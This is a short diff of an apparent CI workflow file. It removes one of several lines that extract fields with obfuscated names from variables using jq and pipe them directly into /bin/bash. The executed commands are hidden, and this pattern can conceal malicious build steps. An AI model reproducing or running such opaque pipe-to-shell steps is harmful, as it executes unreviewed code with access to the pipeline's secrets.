@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
           echo $tu5 | jq -r .oqo32553 | /bin/bash
           printf '%s' "$un17134" | jq -r .kbonb643 | /bin/bash
-          printf '%s' "$yl11175" | jq -r .inpz3 | /bin/bash
           echo $get6 | jq -r .o1579 | /bin/bash
 
       - name: Save results
